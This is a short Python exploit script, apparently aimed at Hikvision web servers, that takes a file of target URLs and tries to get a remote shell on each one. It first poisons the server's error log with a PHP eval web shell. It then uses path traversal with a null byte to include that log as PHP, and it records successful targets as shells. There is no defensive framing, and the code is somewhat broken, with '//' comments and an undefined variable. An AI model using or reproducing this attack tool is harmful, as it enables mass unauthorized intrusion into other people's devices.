#coding:utf-8
import requests
import optparse
import sys
import Queue
import datetime
import os

reload(sys)
sys.setdefaultencoding('utf-8')
q0 = Queue.Queue()
payload1 = "/<?eval($_POST['pass'])?>"
payload2 = '/index.php?controller=../../../../Server/logs/error.log%00.php'
headers = {} //字典
headers["User-Agent"] = 'Opera/9.80 (Windows NT 6.1; U; en) Presto/2.8.131 Version/11.11'


if __name__ == '__main__':

    print(
    '''
		****************************************************
		*           rce getshell(haikang)      *
		*				      Coded by DLF *
		****************************************************
		''')
    nowtime = datetime.datetime.now().strftime('%Y%m%d%H%M%S') //获取时间
    os.mkdir('result/' + str(nowtime))  //根据时间创建文件夹
    f4success = open('result/' + str(nowtime) + '/' + 'success.txt', 'w')
//创建成功的文件
    parser = optparse.OptionParser('python %prog ' + '-h (manual)', version='%prog v1.0')
    parser.add_option('-f', dest='tgtUrlsPath', type='string', help='urls filepath[exploit default]')
    (options, args) = parser.parse_args()
    if options.tgtUrlsPath:
        tgtFilePath = options.tgtUrlsPath
        urlsFile = open(tgtFilePath)
        for urls in urlsFile:
            fullUrls = urls.strip()
            q0.put(fullUrls)
        while(not q0.empty()):
            tgtUrl = q0.get()
            fullUrl1 = tgtUrl + payload1
            fullUrl2 = tgtUrl + payload2
            try:
                rst = requests.get(fullUrl1, headers=headers, timeout=3, verify=False)
            except :
                print('not connect!')
            try:
                rst = requests.get(fullUrl2, headers=headers, timeout=3, verify=False)
                if rst.status_code == 200:
                    print('successful:url:'+fullUrl)
                    f4success.write('shell: ' + fullUrl + '\n')
            except :
                print('~~~~~~~~~~~~~~~!!!timeout!!!~~~~~~~~~~~~~~~')

